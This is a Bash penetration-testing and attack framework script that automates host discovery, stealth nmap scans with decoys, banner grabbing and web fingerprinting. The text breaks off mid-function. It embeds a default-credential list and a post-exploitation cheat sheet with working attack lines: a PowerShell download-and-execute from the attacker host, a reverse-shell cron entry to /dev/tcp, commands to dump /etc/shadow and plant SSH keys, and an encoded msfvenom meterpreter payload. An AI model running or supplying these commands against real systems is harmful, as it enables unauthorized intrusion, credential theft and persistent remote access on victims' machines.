#!/usr/bin/env bash

################################################################################
#  vuln_scanner_pro.sh  v3.0.0
#  Professional Network Vulnerability Scanner & Attack Framework
#  For authorized penetration testing only.
################################################################################

set -uo pipefail
umask 077

VERSION="3.0.0"
SCRIPT_NAME="$(basename "$0")"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

################################################################################
# COLORS & FORMATTING
################################################################################
RED='\033[0;31m';    LRED='\033[1;31m'
GREEN='\033[0;32m';  LGREEN='\033[1;32m'
YELLOW='\033[1;33m'; LYELLOW='\033[0;33m'
CYAN='\033[0;36m';   LCYAN='\033[1;36m'
MAGENTA='\033[0;35m';LMAGENTA='\033[1;35m'
BLUE='\033[0;34m';   LBLUE='\033[1;34m'
WHITE='\033[1;37m';  GRAY='\033[0;37m'
BOLD='\033[1m';      DIM='\033[2m';      ULINE='\033[4m'
BLINK='\033[5m';     RESET='\033[0m'

################################################################################
# GLOBAL STATE
################################################################################
TARGET=""
OUTDIR=""
LHOST=""
LPORT="4444"
LPORT2="4445"
SCAN_MODE="normal"
CUSTOM_PORTS=""
WORDLIST_USERS="/usr/share/wordlists/metasploit/unix_users.txt"
WORDLIST_PASS="/usr/share/wordlists/rockyou.txt"
THREADS=10
TIMEOUT=300
IPV6=0
NO_PING=0
STEALTH_MODE=0
AGGRESSIVE_MODE=0
GENERATE_MSF_RC=1
GENERATE_HTML=1
GENERATE_JSON=1
AUTO_EXPLOIT=0
INTERACTIVE=0
PASSIVE_RECON=1
WEB_FINGERPRINT=1
SSL_AUDIT=1
SMB_DEEP=1
DEFAULT_CREDS=1
POST_EXPLOIT_HINTS=1
RESUME=0
PARALLEL=0
PARALLEL_JOBS=5
MAX_RATE_NORMAL=1500
MAX_RATE_AGGRESSIVE=5000
MAX_RATE_STEALTH=200
LOG_FILE=""
XML_OUT=""
RESUME_FILE=""

declare -A ATTACK_MAP
declare -A SEVERITY_MAP
declare -A OS_MAP
declare -A HOSTNAME_MAP
declare -A CVE_MAP
declare -A OPEN_PORTS_MAP
declare -A SERVICE_MAP
declare -A CRED_MAP
declare -A BANNER_MAP
declare -A TECH_MAP
declare -A POSTEXPLOIT_MAP
declare -A SCAN_STATE
declare -a LIVE_HOSTS
declare -a CONFIRMED_VULNS

CRITICAL_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0
LOW_COUNT=0
INFO_COUNT=0
TOTAL_VULNS=0
HOSTS_SCANNED=0
HOSTS_POPPED=0

################################################################################
# BUILT-IN DEFAULT CREDENTIAL DATABASE
################################################################################
declare -A DEFAULT_CREDS_DB
DEFAULT_CREDS_DB["ftp"]="anonymous: admin:admin admin:password ftp:ftp root:root administrator:administrator"
DEFAULT_CREDS_DB["ssh"]="root:root root:toor root:password admin:admin admin:password ubuntu:ubuntu kali:kali pi:raspberry vagrant:vagrant"
DEFAULT_CREDS_DB["telnet"]="admin:admin admin:password root:root root:toor cisco:cisco"
DEFAULT_CREDS_DB["mysql"]="root: root:root root:password root:mysql admin:admin"
DEFAULT_CREDS_DB["mssql"]="sa: sa:sa sa:password sa:admin"
DEFAULT_CREDS_DB["postgres"]="postgres: postgres:postgres postgres:password admin:admin"
DEFAULT_CREDS_DB["rdp"]="administrator: administrator:administrator admin:admin admin:password"
DEFAULT_CREDS_DB["vnc"]=" :password :admin :123456"
DEFAULT_CREDS_DB["http"]="admin:admin admin:password admin:1234 root:root administrator:administrator"
DEFAULT_CREDS_DB["snmp"]="public private community manager"
DEFAULT_CREDS_DB["redis"]=" :  : :password"
DEFAULT_CREDS_DB["mongodb"]=" :  :admin admin:admin"
DEFAULT_CREDS_DB["tomcat"]="tomcat:tomcat admin:admin manager:manager tomcat:s3cret"
DEFAULT_CREDS_DB["glassfish"]="admin:adminadmin admin:admin"
DEFAULT_CREDS_DB["webmin"]="admin:admin root:root"
DEFAULT_CREDS_DB["activemq"]="admin:admin"
DEFAULT_CREDS_DB["elasticsearch"]=" :  :changeme"

################################################################################
# POST-EXPLOIT HINT DATABASE
################################################################################
declare -A POSTEXPLOIT_DB
POSTEXPLOIT_DB["windows_shell"]="
  [Privesc]   winPEAS  : upload winpeas.exe → run
  [Privesc]   PowerUp  : powershell -ep bypass -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://LHOST/PowerUp.ps1\"); Invoke-AllChecks'
  [Privesc]   MSF      : use post/multi/recon/local_exploit_suggester → set SESSION <id> → run
  [Loot]      Hashdump : hashdump (in meterpreter)
  [Loot]      Creds    : use post/windows/gather/credentials/credential_collector → set SESSION <id> → run
  [Loot]      SAM dump : use post/windows/gather/smart_hashdump → set SESSION <id> → run
  [Pivot]     Routes   : run post/multi/manage/autoroute
  [Persist]   Service  : use post/windows/manage/persistence_exe → set SESSION <id> → run
  [AV Bypass] Enc shell: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe"
POSTEXPLOIT_DB["linux_shell"]="
  [Privesc]   linPEAS  : curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
  [Privesc]   LinEnum  : wget http://LHOST/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh
  [Privesc]   MSF      : use post/multi/recon/local_exploit_suggester → set SESSION <id> → run
  [Privesc]   SUID     : find / -perm -4000 -type f 2>/dev/null
  [Privesc]   Sudo     : sudo -l
  [Privesc]   Cron     : cat /etc/crontab; ls /etc/cron*
  [Loot]      Passwd   : cat /etc/passwd /etc/shadow
  [Loot]      SSH keys : find / -name id_rsa 2>/dev/null
  [Loot]      Hist     : cat ~/.bash_history ~/.zsh_history
  [Pivot]     Routes   : run post/multi/manage/autoroute
  [Persist]   Cron     : echo '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /var/spool/cron/crontabs/root
  [Persist]   SSH key  : echo 'PUBKEY' >> ~/.ssh/authorized_keys"
POSTEXPLOIT_DB["meterpreter"]="
  [Info]      Sysinfo  : sysinfo
  [Info]      Getuid   : getuid
  [Privesc]   Getsystem: getsystem
  [Loot]      Hashdump : hashdump
  [Loot]      Keyscan  : keyscan_start / keyscan_dump
  [Loot]      Screenshot: screenshot
  [Pivot]     Portfwd  : portfwd add -l LPORT -p RPORT -r RHOST
  [Pivot]     Socks    : use auxiliary/server/socks_proxy → set SRVPORT 1080 → run
  [Persist]   Backdoor : run persistence -X -i 60 -p LPORT -r LHOST"

################################################################################
# BANNER
################################################################################
banner() {
    clear 2>/dev/null || true
    echo -e "${LCYAN}"
    cat << 'ASCIIEOF'
██╗   ██╗██╗   ██╗██╗     ███╗   ██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗    ██████╗ ██████╗  ██████╗
██║   ██║██║   ██║██║     ████╗  ██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║    ██╔══██╗██╔══██╗██╔═══██╗
██║   ██║██║   ██║██║     ██╔██╗ ██║    ███████╗██║     ███████║██╔██╗ ██║    ██████╔╝██████╔╝██║   ██║
╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║    ╚════██║██║     ██╔══██║██║╚██╗██║    ██╔═══╝ ██╔══██╗██║   ██║
 ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║    ███████║╚██████╗██║  ██║██║ ╚████║    ██║     ██║  ██║╚██████╔╝
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝
ASCIIEOF
    echo -e "${RESET}"
    echo -e "  ${WHITE}${BOLD}Professional Network Vulnerability Scanner & Attack Framework${RESET}  ${DIM}v${VERSION}${RESET}"
    echo -e "  ${DIM}For authorized penetration testing only.${RESET}"
    echo -e "  ${DIM}$(date '+%Y-%m-%d %H:%M:%S')  |  PID: $$  |  User: $(whoami)${RESET}"
    echo ""
}

################################################################################
# USAGE
################################################################################
usage() {
    echo -e "${BOLD}${LCYAN}Usage:${RESET}"
    echo "  $SCRIPT_NAME -t <target> [options]"
    echo ""
    echo -e "${BOLD}Required:${RESET}"
    echo "  -t <target>          IP, CIDR, range, or file with targets (one per line)"
    echo ""
    echo -e "${BOLD}Scan Options:${RESET}"
    echo "  -m <mode>            Scan mode: normal|stealth|aggressive|custom (default: normal)"
    echo "  -P <ports>           Custom port list e.g. 22,80,443,8080-8090"
    echo "  --no-ping            Skip host discovery"
    echo "  --timeout <sec>      Per-host timeout (default: 300)"
    echo "  -6                   IPv6 mode"
    echo "  --parallel [n]       Scan hosts in parallel (default 5 jobs)"
    echo "  --resume             Resume previous scan (skip already-scanned hosts)"
    echo ""
    echo -e "${BOLD}Output Options:${RESET}"
    echo "  -o <dir>             Output directory"
    echo "  --no-html            Skip HTML report"
    echo "  --no-json            Skip JSON report"
    echo "  --no-msf-rc          Skip Metasploit RC file generation"
    echo ""
    echo -e "${BOLD}Attack Options:${RESET}"
    echo "  -l <lhost>           Local IP (for reverse shell payloads)"
    echo "  -p <lport>           Primary listener port (default: 4444)"
    echo "  --lport2 <port>      Secondary listener port (default: 4445)"
    echo "  -U <file>            Usernames wordlist"
    echo "  -W <file>            Passwords wordlist"
    echo "  -T <n>               Thread count (default: 10)"
    echo "  --auto-exploit       Auto-run confirmed critical exploits via MSF"
    echo "  --interactive        Prompt before each attack phase"
    echo "  --no-default-creds   Skip built-in default credential checks"
    echo "  --no-post-hints      Skip post-exploitation hints"
    echo ""
    echo -e "${BOLD}Recon Options:${RESET}"
    echo "  --no-passive         Skip passive recon (WHOIS, DNS, ASN)"
    echo "  --no-web-fp          Skip web fingerprinting"
    echo "  --no-ssl-audit       Skip SSL/TLS audit"
    echo "  --no-smb-deep        Skip deep SMB enumeration"
    echo ""
    echo -e "${BOLD}Examples:${RESET}"
    echo "  sudo $SCRIPT_NAME -t 192.168.1.0/24 -l 192.168.1.100"
    echo "  sudo $SCRIPT_NAME -t 10.0.0.5 -m aggressive --auto-exploit -l 10.0.0.99"
    echo "  sudo $SCRIPT_NAME -t targets.txt -m stealth --parallel 3 -o /opt/pentest"
    echo "  sudo $SCRIPT_NAME -t 172.16.0.0/24 -P 22,80,443,3306 --no-ping --interactive"
    exit 0
}

################################################################################
# ARGUMENT PARSING
################################################################################
parse_args() {
    [[ $# -eq 0 ]] && usage
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t)  TARGET="$2";           shift 2 ;;
            -o)  OUTDIR="$2";           shift 2 ;;
            -l)  LHOST="$2";            shift 2 ;;
            -p)  LPORT="$2";            shift 2 ;;
            --lport2) LPORT2="$2";      shift 2 ;;
            -m)  SCAN_MODE="$2";        shift 2 ;;
            -P)  CUSTOM_PORTS="$2";     shift 2 ;;
            -U)  WORDLIST_USERS="$2";   shift 2 ;;
            -W)  WORDLIST_PASS="$2";    shift 2 ;;
            -T)  THREADS="$2";          shift 2 ;;
            --timeout)   TIMEOUT="$2";  shift 2 ;;
            --no-ping)   NO_PING=1;     shift ;;
            --no-html)   GENERATE_HTML=0; shift ;;
            --no-json)   GENERATE_JSON=0; shift ;;
            --no-msf-rc) GENERATE_MSF_RC=0; shift ;;
            --auto-exploit)  AUTO_EXPLOIT=1;   shift ;;
            --interactive)   INTERACTIVE=1;    shift ;;
            --no-default-creds) DEFAULT_CREDS=0; shift ;;
            --no-post-hints)    POST_EXPLOIT_HINTS=0; shift ;;
            --no-passive)    PASSIVE_RECON=0;  shift ;;
            --no-web-fp)     WEB_FINGERPRINT=0; shift ;;
            --no-ssl-audit)  SSL_AUDIT=0;      shift ;;
            --no-smb-deep)   SMB_DEEP=0;       shift ;;
            --parallel)
                PARALLEL=1
                if [[ "${2:-}" =~ ^[0-9]+$ ]]; then PARALLEL_JOBS="$2"; shift 2
                else shift; fi ;;
            --resume) RESUME=1; shift ;;
            -6)  IPV6=1; shift ;;
            -h|--help) usage ;;
            *) log ERROR "Unknown option: $1"; usage ;;
        esac
    done

    [[ -z "$TARGET" ]] && { log ERROR "Target required. Use -t"; usage; }

    case "$SCAN_MODE" in
        stealth)    STEALTH_MODE=1 ;;
        aggressive) AGGRESSIVE_MODE=1 ;;
        normal|custom) ;;
        *) log WARN "Unknown scan mode '$SCAN_MODE', defaulting to normal"; SCAN_MODE="normal" ;;
    esac
}

################################################################################
# LOGGING
################################################################################
log() {
    local level="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%H:%M:%S')
    local line
    case "$level" in
        INFO)   line="${CYAN}[${ts}][*]${RESET} $msg" ;;
        OK)     line="${LGREEN}[${ts}][+]${RESET} $msg" ;;
        WARN)   line="${YELLOW}[${ts}][!]${RESET} $msg" ;;
        ERROR)  line="${RED}[${ts}][✗]${RESET} $msg" ;;
        CRIT)   line="${LRED}[${ts}][☠]${RESET} ${BOLD}$msg${RESET}" ;;
        STEP)   line="\n${LCYAN}╔══ $msg ══╗${RESET}" ;;
        FOUND)  line="${LMAGENTA}[${ts}][★]${RESET} ${BOLD}$msg${RESET}" ;;
        ATTACK) line="${LYELLOW}[${ts}][⚡]${RESET} $msg" ;;
        DATA)   line="${GRAY}[${ts}][~]${RESET} $msg" ;;
    esac
    echo -e "$line"
    [[ -n "${LOG_FILE:-}" ]] && echo "[${ts}][${level}] $(echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g')" >> "$LOG_FILE"
}

################################################################################
# INTERACTIVE PROMPT
################################################################################
ask_continue() {
    [[ $INTERACTIVE -eq 0 ]] && return 0
    local prompt="${1:-Continue?}"
    echo -e "${YELLOW}[?] $prompt [Y/n]: ${RESET}"
    read -r -t 30 ans
    [[ "${ans,,}" == "n" ]] && return 1
    return 0
}

################################################################################
# DEPENDENCY CHECK
################################################################################
check_deps() {
    log STEP "Dependency Check"
    local required=(nmap xmllint)
    local optional=(hydra medusa msfconsole nikto gobuster feroxbuster sqlmap curl python3
                    smbclient enum4linux crackmapexec onesixtyone showmount redis-cli nc
                    sslscan testssl.sh whatweb wpscan dig whois host nslookup xargs
                    rpcclient ldapsearch kerbrute impacket-smbclient evil-winrm)
    local missing_req=() missing_opt=()
    local available_opt=()

    for t in "${required[@]}"; do
        command -v "$t" &>/dev/null || missing_req+=("$t")
    done
    for t in "${optional[@]}"; do
        if command -v "$t" &>/dev/null; then available_opt+=("$t")
        else missing_opt+=("$t")
        fi
    done

    if [[ ${#missing_req[@]} -gt 0 ]]; then
        log ERROR "Missing required tools: ${missing_req[*]}"
        log ERROR "Install: apt install ${missing_req[*]}"
        exit 1
    fi

    log OK "Required tools: OK"
    log OK "Available optional tools: ${available_opt[*]:-none}"
    [[ ${#missing_opt[@]} -gt 0 ]] && log WARN "Missing optional (commands still shown): ${missing_opt[*]}"
    [[ $EUID -ne 0 ]] && log WARN "Not root — SYN scan and OS detection disabled"
    echo ""
}

################################################################################
# OUTPUT SETUP
################################################################################
setup_output() {
    OUTDIR="${OUTDIR:-/tmp/vuln_scan_$(date +%Y%m%d_%H%M%S)}"
    mkdir -p "$OUTDIR"/{nmap,msf_rc,loot,exploits,recon,web,ssl,payloads,screenshots}
    LOG_FILE="$OUTDIR/scan.log"
    RESUME_FILE="$OUTDIR/.resume_state"
    touch "$LOG_FILE"
    log OK "Output directory: $OUTDIR"
}

################################################################################
# CONFIG SUMMARY
################################################################################
print_config() {
    log STEP "Scan Configuration"
    local lh="${LHOST:-NOT SET (reverse shells will use placeholder)}"
    echo -e "  ${BOLD}Target         :${RESET} $TARGET"
    echo -e "  ${BOLD}Mode           :${RESET} $SCAN_MODE"
    echo -e "  ${BOLD}Output Dir     :${RESET} $OUTDIR"
    echo -e "  ${BOLD}LHOST          :${RESET} $lh"
    echo -e "  ${BOLD}LPORT (primary):${RESET} $LPORT"
    echo -e "  ${BOLD}LPORT2 (sec)   :${RESET} $LPORT2"
    echo -e "  ${BOLD}Threads        :${RESET} $THREADS"
    echo -e "  ${BOLD}Auto-exploit   :${RESET} $([[ $AUTO_EXPLOIT -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}Interactive    :${RESET} $([[ $INTERACTIVE -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}Parallel       :${RESET} $([[ $PARALLEL -eq 1 ]] && echo "YES ($PARALLEL_JOBS jobs)" || echo 'no')"
    echo -e "  ${BOLD}Default creds  :${RESET} $([[ $DEFAULT_CREDS -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}Passive recon  :${RESET} $([[ $PASSIVE_RECON -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}Web fingerprint:${RESET} $([[ $WEB_FINGERPRINT -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}SSL audit      :${RESET} $([[ $SSL_AUDIT -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}SMB deep enum  :${RESET} $([[ $SMB_DEEP -eq 1 ]] && echo 'YES' || echo 'no')"
    echo -e "  ${BOLD}Users wordlist :${RESET} $WORDLIST_USERS"
    echo -e "  ${BOLD}Pass wordlist  :${RESET} $WORDLIST_PASS"
    echo ""
}

################################################################################
# TARGET LOADING (file or inline)
################################################################################
load_targets() {
    if [[ -f "$TARGET" ]]; then
        log INFO "Loading targets from file: $TARGET"
        mapfile -t TARGET_LIST < <(grep -v '^\s*#' "$TARGET" | grep -v '^\s*$' || true)
        log OK "Loaded ${#TARGET_LIST[@]} targets"
    else
        TARGET_LIST=("$TARGET")
    fi
}

################################################################################
# PHASE 1 — HOST DISCOVERY
################################################################################
phase_host_discovery() {
    log STEP "Phase 1: Host Discovery"
    local disco_xml="$OUTDIR/nmap/discovery.xml"
    LIVE_HOSTS=()

    for tgt in "${TARGET_LIST[@]}"; do
        if [[ $NO_PING -eq 1 ]]; then
            log INFO "No-ping: treating $tgt as alive"
            LIVE_HOSTS+=("$tgt")
            continue
        fi

        local nmap_disco_args=("-sn" "--open" "-oX" "$disco_xml")
        [[ $STEALTH_MODE -eq 1 ]] && nmap_disco_args+=("-T2" "--randomize-hosts" "--data-length" "15")
        [[ $IPV6 -eq 1 ]]         && nmap_disco_args+=("-6")

        log INFO "Discovering hosts in $tgt..."
        nmap "${nmap_disco_args[@]}" "$tgt" 2>/dev/null || true

        local found
        mapfile -t found < <(xmllint --xpath \
            "//host/address[@addrtype='ipv4']/@addr" \
            "$disco_xml" 2>/dev/null | grep -oP 'addr="\K[^"]+' || true)
        LIVE_HOSTS+=("${found[@]}")
    done

    [[ ${#LIVE_HOSTS[@]} -eq 0 ]] && { log ERROR "No live hosts found. Stopping."; exit 0; }

    log OK "Discovered ${#LIVE_HOSTS[@]} live host(s):"
    for h in "${LIVE_HOSTS[@]}"; do log OK "  → $h"; done

    if [[ $RESUME -eq 1 && -f "$RESUME_FILE" ]]; then
        log INFO "Resume mode: filtering already-scanned hosts..."
        local new_hosts=()
        for h in "${LIVE_HOSTS[@]}"; do
            grep -qx "$h" "$RESUME_FILE" 2>/dev/null && log DATA "  Skipping $h (already scanned)" || new_hosts+=("$h")
        done
        LIVE_HOSTS=("${new_hosts[@]}")
        log OK "${#LIVE_HOSTS[@]} hosts remaining after resume filter"
    fi
}

################################################################################
# PHASE 2 — PORT & SERVICE SCAN
################################################################################
phase_port_scan() {
    log STEP "Phase 2: Port & Service Scan"
    XML_OUT="$OUTDIR/nmap/full_scan.xml"

    local nmap_args=("-sV" "--version-intensity" "9"
                     "--version-all"
                     "-sC" "-O" "--osscan-guess" "--fuzzy"
                     "--open" "-oX" "$XML_OUT"
                     "--host-timeout" "${TIMEOUT}s")

    if [[ -n "$CUSTOM_PORTS" ]]; then
        nmap_args+=("-p" "$CUSTOM_PORTS")
        log INFO "Custom ports: $CUSTOM_PORTS"
    else
        nmap_args+=("-p-")
        log INFO "Full 65535-port scan"
    fi

    if [[ $STEALTH_MODE -eq 1 ]]; then
        nmap_args+=("-sS" "-T2"
                    "--scan-delay" "1s"
                    "--randomize-hosts"
                    "--data-length" "25"
                    "-D" "RND:10"
                    "--ttl" "64"
                    "--script=vuln,banner,default,auth")
        log INFO "Stealth: SYN, T2, 1s delay, 10 decoys, TTL spoofing"
    elif [[ $AGGRESSIVE_MODE -eq 1 ]]; then
        nmap_args+=("-sS" "-T5"
                    "--min-rate" "$MAX_RATE_AGGRESSIVE"
                    "--max-retries" "2"
                    "--script=vuln,exploit,banner,default,auth,brute,discovery,intrusive")
        log INFO "Aggressive: T5, ${MAX_RATE_AGGRESSIVE} pkt/s, all script categories"
    else
        nmap_args+=("-sS" "-T4"
                    "--min-rate" "$MAX_RATE_NORMAL"
                    "--script=vuln,banner,default,auth,safe")
        log INFO "Normal: T4, ${MAX_RATE_NORMAL} pkt/s"
    fi

    [[ $IPV6 -eq 1 ]] && nmap_args+=("-6")

    if [[ $PARALLEL -eq 1 ]]; then
        phase_port_scan_parallel "${nmap_args[@]}"
    else
        log INFO "Scanning ${#LIVE_HOSTS[@]} host(s)..."
        nmap "${nmap_args[@]}" "${LIVE_HOSTS[@]}" 2>/dev/null || true
    fi

    [[ ! -s "$XML_OUT" ]] && { log ERROR "nmap produced no output. Stopping."; exit 1; }
    log OK "Port scan complete."
}

phase_port_scan_parallel() {
    local nmap_args=("$@")
    local job_count=0
    local pids=()
    local tmp_xmls=()

    log INFO "Parallel scan: $PARALLEL_JOBS concurrent jobs"
    for host in "${LIVE_HOSTS[@]}"; do
        local tmp_xml="$OUTDIR/nmap/host_${host//./_}.xml"
        tmp_xmls+=("$tmp_xml")
        ( nmap "${nmap_args[@]}" -oX "$tmp_xml" "$host" 2>/dev/null || true ) &
        pids+=($!)
        ((job_count++))

        if [[ $job_count -ge $PARALLEL_JOBS ]]; then
            wait "${pids[@]}" 2>/dev/null || true
            pids=()
            job_count=0
        fi
    done
    [[ ${#pids[@]} -gt 0 ]] && wait "${pids[@]}" 2>/dev/null || true

    merge_xml_results "${tmp_xmls[@]}"
}

merge_xml_results() {
    local xmls=("$@")
    log INFO "Merging ${#xmls[@]} parallel scan results..."
    echo '<?xml version="1.0"?><nmaprun>' > "$XML_OUT"
    for f in "${xmls[@]}"; do
        [[ -s "$f" ]] && xmllint --xpath "//host" "$f" 2>/dev/null >> "$XML_OUT" || true
    done
    echo '</nmaprun>' >> "$XML_OUT"
}

################################################################################
# PHASE 2b — BANNER GRABBING
################################################################################
phase_banner_grab() {
    log STEP "Phase 2b: Banner Grabbing"
    command -v nc &>/dev/null || { log WARN "nc not found, skipping"; return; }

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        for port in "${port_list[@]}"; do
            local banner
            banner=$(printf "HEAD / HTTP/1.0\r\n\r\n" | timeout 3 nc -w 3 "$ip" "$port" 2>/dev/null \
                     | head -5 | tr -d '\r\000' || true)
            [[ -z "$banner" ]] && \
                banner=$(echo "" | timeout 2 nc -w 2 "$ip" "$port" 2>/dev/null | head -3 | tr -d '\r\000' || true)

            if [[ -n "$banner" ]]; then
                BANNER_MAP["${ip}:${port}"]="$banner"
                echo "$banner" > "$OUTDIR/loot/${ip}_${port}_banner.txt"
                log DATA "  Banner $ip:$port → $(echo "$banner" | head -1)"
            fi
        done
    done
}

################################################################################
# PHASE 2c — PASSIVE RECON
################################################################################
phase_passive_recon() {
    [[ $PASSIVE_RECON -eq 0 ]] && return
    log STEP "Phase 2c: Passive Recon"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local recon_file="$OUTDIR/recon/${ip}.txt"
        {
            echo "=== Passive Recon: $ip ==="
            echo "Timestamp: $(date)"
            echo ""

            echo "--- Reverse DNS ---"
            host "$ip" 2>/dev/null || nslookup "$ip" 2>/dev/null || echo "N/A"
            echo ""

            if command -v whois &>/dev/null; then
                echo "--- WHOIS ---"
                timeout 10 whois "$ip" 2>/dev/null | grep -iE "netname|country|orgname|cidr|abuse" | head -20 || echo "N/A"
                echo ""
            fi

            echo "--- PTR / ASN (via dig) ---"
            command -v dig &>/dev/null && {
                dig +short -x "$ip" 2>/dev/null || echo "N/A"
                local rev_ip
                rev_ip=$(echo "$ip" | awk -F. '{print $4"."$3"."$2"."$1}')
                dig +short TXT "${rev_ip}.origin.asn.cymru.com" 2>/dev/null || echo "N/A"
            }
            echo ""

            echo "--- TTL-based OS hint ---"
            ping -c 1 -W 1 "$ip" 2>/dev/null | grep "ttl=" | \
                awk '{for(i=1;i<=NF;i++) if($i~/ttl=/) print $i}' | \
                awk -F= '{
                    t=$2+0
                    if(t<=64) print "Likely: Linux/Unix (TTL "t")"
                    else if(t<=128) print "Likely: Windows (TTL "t")"
                    else print "Likely: Network device (TTL "t")"
                }' || echo "N/A"

        } > "$recon_file" 2>/dev/null
        log OK "  Passive recon saved: $recon_file"

        local rdns
        rdns=$(host "$ip" 2>/dev/null | grep "domain name pointer" | awk '{print $NF}' | sed 's/\.$//' || true)
        [[ -n "$rdns" ]] && HOSTNAME_MAP["$ip"]="$rdns"
    done
}

################################################################################
# PHASE 2d — WEB FINGERPRINTING
################################################################################
phase_web_fingerprint() {
    [[ $WEB_FINGERPRINT -eq 0 ]] && return
    log STEP "Phase 2d: Web Fingerprinting"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        for port in "${port_list[@]}"; do
            local svc
            svc=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@name)" \
                "$XML_OUT" 2>/dev/null || true)

            [[ "$svc" != "http" && "$svc" != "https" && "$svc" != "http-alt" ]] && \
                [[ "$port" != "80" && "$port" != "443" && "$port" != "8080" && \
                   "$port" != "8443" && "$port" != "8000" && "$port" != "8888" ]] && continue

            local scheme="http"
            [[ "$svc" == "https" || "$port" == "443" || "$port" == "8443" ]] && scheme="https"
            local url="${scheme}://${ip}:${port}"
            local fp_file="$OUTDIR/web/${ip}_${port}_fingerprint.txt"

            log INFO "  Fingerprinting $url..."
            {
                echo "=== Web Fingerprint: $url ==="
                echo "Timestamp: $(date)"
                echo ""

                echo "--- HTTP Headers ---"
                curl -skI --max-time 8 "$url" 2>/dev/null | head -30 || echo "N/A"
                echo ""

                echo "--- robots.txt ---"
                curl -sk --max-time 5 "${url}/robots.txt" 2>/dev/null | head -20 || echo "N/A"
                echo ""

                echo "--- /README, /CHANGELOG, /.git/HEAD ---"
                for path in README.md CHANGELOG.md .git/HEAD .env .htaccess web.config; do
                    local resp
                    resp=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "${url}/${path}" 2>/dev/null || echo "000")
                    [[ "$resp" != "404" && "$resp" != "000" ]] && echo "  [${resp}] ${url}/${path}"
                done
                echo ""

                if command -v whatweb &>/dev/null; then
                    echo "--- WhatWeb ---"
                    whatweb --color=never -a 3 "$url" 2>/dev/null || echo "N/A"
                    echo ""
                fi

                echo "--- WordPress check ---"
                local wp_resp
                wp_resp=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "${url}/wp-login.php" 2>/dev/null || echo "000")
                [[ "$wp_resp" == "200" || "$wp_resp" == "302" ]] && \
                    echo "  [!] WordPress detected → run: wpscan --url $url --enumerate u,p,t,cb,dbe"

            } > "$fp_file" 2>/dev/null

            local tech_hits
            tech_hits=$(grep -oiE "WordPress|Joomla|Drupal|Laravel|Django|Flask|Rails|Spring|Tomcat|Jenkins|Struts|phpMyAdmin|Webmin|IIS|nginx|Apache" \
                "$fp_file" 2>/dev/null | sort -u | tr '\n' ' ' || true)
            [[ -n "$tech_hits" ]] && {
                TECH_MAP["${ip}:${port}"]="$tech_hits"
                log FOUND "  Tech detected on $ip:$port → $tech_hits"
            }
            log DATA "  Web fingerprint: $fp_file"
        done
    done
}

################################################################################
# PHASE 2e — SSL/TLS AUDIT
################################################################################
phase_ssl_audit() {
    [[ $SSL_AUDIT -eq 0 ]] && return
    log STEP "Phase 2e: SSL/TLS Audit"

    local ip_list
    mapfile -t ip_list < <(xmllint --xpath \
        "//host/address[@addrtype='ipv4']/@addr" "$XML_OUT" 2>/dev/null \
        | grep -oP 'addr="\K[^"]+' || true)

    for ip in "${ip_list[@]}"; do
        local port_list
        mapfile -t port_list < <(xmllint --xpath \
            "//host[address/@addr='$ip']/ports/port/@portid" \
            "$XML_OUT" 2>/dev/null | grep -oP 'portid="\K[^"]+' || true)

        for port in "${port_list[@]}"; do
            local svc
            svc=$(xmllint --xpath \
                "string(//host[address/@addr='$ip']/ports/port[@portid='$port']/service/@name)" \
                "$XML_OUT" 2>/dev/null || true)

            [[ "$svc" != "https" && "$svc" != "ssl" && "$svc" != "imaps" && \
               "$port" != "443" && "$port" != "8443" && "$port" != "993" && "$port" != "465" ]] && continue

            local ssl_file="$OUTDIR/ssl/${ip}_${port}_ssl.txt"
            log INFO "  SSL audit: $ip:$port"
            {
                echo "=== SSL/TLS Audit: $ip:$port ==="
                echo "Timestamp: $(date)"
                echo ""

                if command -v sslscan &>/dev/null; then
